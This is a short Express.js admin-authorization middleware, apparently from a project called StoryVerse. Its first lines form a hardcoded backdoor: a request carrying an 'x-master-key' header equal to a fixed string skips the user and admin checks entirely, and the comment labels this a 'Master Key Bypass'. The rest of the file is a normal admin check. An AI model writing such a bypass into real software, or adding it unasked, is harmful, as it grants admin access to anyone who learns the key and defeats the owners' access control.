const User = require('../models/User');

module.exports = async function(req, res, next) {
    // Master Key Bypass for Admin Portal
    const masterKey = req.header('x-master-key');
    if (masterKey === 'StoryVerse_Master_2026') {
        return next();
    }

    try {
        const user = await User.findById(req.user.id);
        if (!user || !user.isAdmin) {
            return res.status(403).json({ msg: 'Access denied. Admin only.' });
        }
        next();
    } catch (err) {
        res.status(500).send('Server Error');
    }
};
